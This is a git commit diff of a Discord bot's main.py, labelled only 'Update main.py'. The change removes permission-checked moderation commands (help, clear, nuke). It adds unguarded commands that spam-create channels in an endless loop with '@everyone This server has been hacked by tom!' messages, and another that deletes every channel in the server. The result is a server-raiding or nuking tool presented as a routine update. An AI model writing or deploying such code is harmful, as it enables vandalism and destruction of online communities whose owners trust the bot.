00b44aef0c15f652bac7c7486b7df15ab5e16766
btw-iUseArch <100770110+btw-iUseArch@users.noreply.github.com>
2022-03-04 13:24:40 +0530

    Update main.py

--- main.py
+++ main.py
@@ -12,50 +12,25 @@ async def on_ready():
     activity = discord.Activity(type=discord.ActivityType.watching, name="Netflix")
     await client.change_presence(status=discord.Status.idle, activity=activity)
 
-@client.command()
-async def help(ctx):
-    embedVar = discord.Embed(title="Commands", description="_ _", color=0x00bfff)
-    embedVar.add_field(name="?clear number", value="Deletes the specified number of messages. If the number is not"
-                                                   "specified, it deletes the last 20 messages", inline=False)
-    embedVar.add_field(name="?nuke", value="Deletes all the messages in the channel.", inline=False)
-    await ctx.send(embed=embedVar)
+loop = True
 
 @client.command()
-@commands.has_permissions(manage_messages=True)
-async def clear(ctx, amount=20):
-    await ctx.channel.purge(limit=amount+1)
-    if amount == 1:
-        message1 = await ctx.send(f"Deleted 1 message :+1:")
-        await asyncio.sleep(5)
-        await message1.delete()
-    else:
-        message2 = await ctx.send(f"Deleted {amount} messages :+1:")
-        await asyncio.sleep(5)
-        await message2.delete()
-
-@clear.error
-async def clear_error(ctx, error):
-    message = await ctx.send(":negative_squared_cross_mark: You don't have permission to do that!")
-    await asyncio.sleep(5)
-    await message.delete()
-
+async def nuke(ctx):
+    global loop
+    while loop == True:
+        guild = ctx.guild
+        channel = await guild.create_text_channel("tom is god")
+        await channel.send("@everyone This server has been hacked by tom!")
 
 @client.command()
-@commands.has_permissions(manage_messages=True)
-async def nuke(ctx, channel: discord.TextChannel=None):
-    channel = channel or ctx.channel
-    count = 0
-    async for _ in channel.history(limit=None):
-        count += 1
-    await ctx.channel.purge(limit=count)
-    message = await ctx.send(f"Nuked {channel.mention}")
-    await asyncio.sleep(5)
-    await message.delete()
+async def stop(ctx):
+    global loop
+    loop = False
 
-@nuke.error
-async def nuke_error(ctx, error):
-    message = await ctx.send(":negative_squared_cross_mark: You don't have permission to do that!")
-    await asyncio.sleep(5)
-    await message.delete()
+@client.command()
+async def delete(ctx):
+    for c in ctx.guild.channels:
+        await c.delete()
+
 
 client.run(os.getenv("DISCORD_TOKEN"))
